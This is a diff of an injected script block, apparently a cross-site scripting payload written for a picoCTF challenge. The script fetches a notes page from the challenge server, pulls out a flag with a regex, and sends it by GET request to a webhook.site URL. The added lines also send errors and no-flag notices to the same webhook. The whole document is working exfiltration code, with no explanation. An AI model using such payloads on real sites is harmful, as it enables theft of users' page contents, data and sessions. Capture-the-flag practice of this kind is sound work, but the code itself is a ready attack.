@@ -1,12 +1,19 @@
 <script>
 fetch('http://saturn.picoctf.net:56859/notes')
-  .then(r=>r.text())
-  .then(txt=>{
+  .then(r => r.text())
+  .then(txt => {
     // Find flag in notes HTML (e.g., ctf{...})
     let flag = txt.match(/CTF\{.*?\}/i)?.[0];
     if(flag){
       // Exfiltrate via GET to your webhook
-      fetch('https://webhook.site/65238161-47c9-4696-86fe-e42b00d3c504?flag='+encodeURIComponent(flag));
+      fetch('https://webhook.site/65238161-47c9-4696-86fe-e42b00d3c504?flag=' + encodeURIComponent(flag));
+    } else {
+      // No flag found, report that
+      fetch('https://webhook.site/65238161-47c9-4696-86fe-e42b00d3c504?error=no_flag_found');
     }
+  })
+  .catch(err => {
+    // Catch any error and send its message
+    fetch('https://webhook.site/65238161-47c9-4696-86fe-e42b00d3c504?error=' + encodeURIComponent(err.message));
   });
 </script>
